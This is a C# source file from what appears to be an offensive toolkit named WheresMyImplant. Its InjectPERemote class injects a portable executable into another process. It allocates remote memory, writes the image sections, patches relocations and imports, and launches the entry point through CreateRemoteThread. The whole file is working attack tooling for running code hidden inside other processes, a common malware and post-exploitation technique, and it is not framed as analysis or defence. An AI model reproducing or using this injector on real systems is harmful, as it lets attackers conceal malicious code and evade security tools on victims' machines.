using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

using MonkeyWorks.Unmanaged.Headers;
using MonkeyWorks.Unmanaged.Libraries;

namespace WheresMyImplant
{
    class InjectPERemote : BaseRemote
    {
        private const UInt32 PROCESS_CREATE_THREAD = 0x0002;
        private const UInt32 PROCESS_QUERY_INFORMATION = 0x0400;
        private const UInt32 PROCESS_VM_OPERATION = 0x0008;
        private const UInt32 PROCESS_VM_WRITE = 0x0020;
        private const UInt32 PROCESS_VM_READ = 0x0010;

        private const UInt32 MEM_COMMIT = 0x00001000;
        private const UInt32 MEM_RESERVE = 0x00002000;

        private const UInt32 PAGE_READWRITE = 0x04;
        private const UInt32 PAGE_EXECUTE_READ = 0x20;
        private const UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        internal PELoader peLoader;
        internal String parameters;

        internal InjectPERemote(UInt32 processId, PELoader peLoader, String parameters) : base(processId)
        {
            this.peLoader = peLoader;
            this.parameters = parameters;
        }

        internal void Execute()
        {
            Boolean targetArch = Is32BitProcess();
            if (peLoader.is64Bit == targetArch)
            {
                Console.WriteLine("[-] Architechure Mismatch");
                Console.WriteLine("[-] Source: {0}", peLoader.is64Bit);
                Console.WriteLine("[-] Destination: {0}", targetArch);
                return;
            }

            Winnt.MEMORY_PROTECTION_CONSTANTS protection = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READWRITE;
            if (Winnt.DLL_CHARACTERISTICS.IMAGE_DLLCHARACTERISTICS_NX_COMPAT == (Winnt.DLL_CHARACTERISTICS)((UInt16)Winnt.DLL_CHARACTERISTICS.IMAGE_DLLCHARACTERISTICS_NX_COMPAT & peLoader.dllCharacteristics))
            {
                protection = Winnt.MEMORY_PROTECTION_CONSTANTS.PAGE_EXECUTE_READ;
            }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpBaseAddress = VirtualAllocExChecked(IntPtr.Zero, peLoader.sizeOfImage, protection);
            if (IntPtr.Zero == lpBaseAddress)
            {
                return;
            }
            Console.WriteLine("[*] Iterating through {0} Headers", peLoader.imageFileHeader.NumberOfSections);

            ////////////////////////////////////////////////////////////////////////////////
            for (Int32 i = 0; i < peLoader.imageFileHeader.NumberOfSections; i++)
            {
                IntPtr lpBaseAddressSection = new IntPtr(lpBaseAddress.ToInt64() + peLoader.imageSectionHeaders[i].VirtualAddress);
                GCHandle pinnedArray = GCHandle.Alloc(peLoader.imageBytes, GCHandleType.Pinned);
                IntPtr imageBytesPtr = new IntPtr((Int64)pinnedArray.AddrOfPinnedObject() + peLoader.imageSectionHeaders[i].PointerToRawData);
                String sectionName = new String(peLoader.imageSectionHeaders[i].Name);
                WriteProcessMemoryChecked(lpBaseAddressSection, imageBytesPtr, peLoader.imageSectionHeaders[i].SizeOfRawData, sectionName);
           }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpRelocationTable = new IntPtr(lpBaseAddress.ToInt64() + peLoader.baseRelocationTableAddress);

            Winnt._IMAGE_BASE_RELOCATION relocationEntry = PtrToStructureRemote<Winnt._IMAGE_BASE_RELOCATION>(lpRelocationTable);
            UInt32 imageSizeOfBaseRelocation = (UInt32)Marshal.SizeOf(typeof(Winnt._IMAGE_BASE_RELOCATION));
            UInt32 sizeOfNextBlock = relocationEntry.SizeOfBlock;
            IntPtr offset = lpRelocationTable;

            Int64 delta64 = lpBaseAddress.ToInt64() - (Int64)peLoader.imageBase;

            ////////////////////////////////////////////////////////////////////////////////
            while (true)
            {
                IntPtr lpNextRelocationEntry = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeOfNextBlock);
                Winnt._IMAGE_BASE_RELOCATION relocationNextEntry = PtrToStructureRemote<Winnt._IMAGE_BASE_RELOCATION>(lpNextRelocationEntry);
                IntPtr destinationAddress = new IntPtr(lpBaseAddress.ToInt64() + (Int32)relocationEntry.VirtualAdress);
                
                ////////////////////////////////////////////////////////////////////////////////
                Int32 entries = (Int32)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2);
                for (Int32 i = 0; i < entries; i++)
                {
                    UInt16 value = ReadInt16Remote(offset, (relocationEntry.SizeOfBlock) + (2 * i));
                    Winnt.TypeOffset type = (Winnt.TypeOffset)(value >> 12);
                    UInt16 patchOffset = (UInt16)(value & 0xfff);
                    IntPtr lpPatchAddress = IntPtr.Zero;
                    switch (type)
                    {
                        case Winnt.TypeOffset.IMAGE_REL_BASED_ABSOLUTE:
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_HIGH:
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_LOW:
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_HIGHLOW:
                            lpPatchAddress = new IntPtr(destinationAddress.ToInt64() + patchOffset);
                            WriteInt64Remote(lpPatchAddress, ReadInt64Remote(lpPatchAddress) + delta64);
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_HIGHADJ:
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_SECTION:
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_REL:
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_DIR64:
                            lpPatchAddress = new IntPtr(destinationAddress.ToInt64() + patchOffset);
                            WriteInt64Remote(lpPatchAddress, ReadInt64Remote(lpPatchAddress) + delta64);
                            break;
                        case Winnt.TypeOffset.IMAGE_REL_BASED_HIGH3ADJ:
                            break;
                        default:
                            break;
                    }
                }
                offset = new IntPtr(lpRelocationTable.ToInt64() + (Int64)sizeOfNextBlock);
                sizeOfNextBlock += relocationNextEntry.SizeOfBlock;
                relocationEntry = relocationNextEntry;
                //"The last entry is set to zero (NULL) to indicate the end of the table." - cool
                if (0 == relocationNextEntry.SizeOfBlock)
                {
                    break;
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            //http://sandsprite.com/CodeStuff/Understanding_imports.html
            ////////////////////////////////////////////////////////////////////////////////
            Int32 sizeOfStruct = Marshal.SizeOf(typeof(Winnt._IMAGE_IMPORT_DESCRIPTOR));
            Int32 multiplier = 0;
            Process localProcess = Process.GetCurrentProcess();
            IntPtr lpLocalBaseAddress = localProcess.MainModule.BaseAddress;
            Process remoteProcess = Process.GetProcessById((Int32)localProcess.Id);
            IntPtr lpRemoteBaseAddress = remoteProcess.MainModule.BaseAddress;
            
            while(true)
            {
                UInt32 dwImportTableAddressOffset = (UInt32)((sizeOfStruct * multiplier++) + peLoader.importTableAddress);
                IntPtr lpImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + dwImportTableAddressOffset);
                Winnt._IMAGE_IMPORT_DESCRIPTOR imageImportDirectory = PtrToStructureRemote<Winnt._IMAGE_IMPORT_DESCRIPTOR>(lpImportAddressTable);
                if (0 == imageImportDirectory.FirstThunk) 
                { 
                    break; 
                }

				////////////////////////////////////////////////////////////////////////////////
				IntPtr dllNamePtr = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.Name);
                String dllName = PtrToStringAnsiRemote(dllNamePtr).Replace("\0", "");
                IntPtr lpLocalModuleAddress = kernel32.LoadLibrary(dllName);
                IntPtr lpModuleBaseAddress = LoadLibraryRemote(dllName);
                WaitForSingleObjectExRemote(lpModuleBaseAddress);
                Console.WriteLine("[+] Library {0}", dllName);
				
				////////////////////////////////////////////////////////////////////////////////
                IntPtr lpRvaImportAddressTable = new IntPtr(lpBaseAddress.ToInt64() + imageImportDirectory.FirstThunk);
                while (true)
                {
                    Int32 dwRvaImportAddressTable = PtrToInt32Remote(lpRvaImportAddressTable);
                    if (0 == dwRvaImportAddressTable)
                    {
                        break;
                    }

                    IntPtr lpDllFunctionName = new IntPtr(lpBaseAddress.ToInt64() + dwRvaImportAddressTable + 2);

                    String dllFunctionName = PtrToStringAnsiRemote(lpDllFunctionName).Replace("\0", "");
                    IntPtr hModule = kernel32.GetModuleHandle(dllName);
                    IntPtr lpLocalFunctionAddress = kernel32.GetProcAddress(hModule, dllFunctionName);
                    IntPtr lpRelativeFunctionAddress = new IntPtr(lpLocalFunctionAddress.ToInt64() - lpLocalBaseAddress.ToInt64());
                    IntPtr lpFunctionAddress = new IntPtr(lpRemoteBaseAddress.ToInt64() + lpRelativeFunctionAddress.ToInt64());
                    Console.WriteLine("[+] \tFunction: {0}", dllFunctionName);

                    if (!WriteInt64Remote(lpRvaImportAddressTable, (Int64)lpFunctionAddress))
                    {
                        Console.WriteLine("[-] RvaImportAddressTable Write Failed");
                        return;
                    }
                    lpRvaImportAddressTable = new IntPtr(lpRvaImportAddressTable.ToInt64() + sizeof(Int64));
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpStartAddress = new IntPtr(lpBaseAddress.ToInt64() + peLoader.addressOfEntryPoint);
            IntPtr lpParameter = IntPtr.Zero;
            IntPtr hThread = IntPtr.Zero;
            CreateRemoteThreadChecked(lpStartAddress, lpParameter, hThread);
        }
    }
}
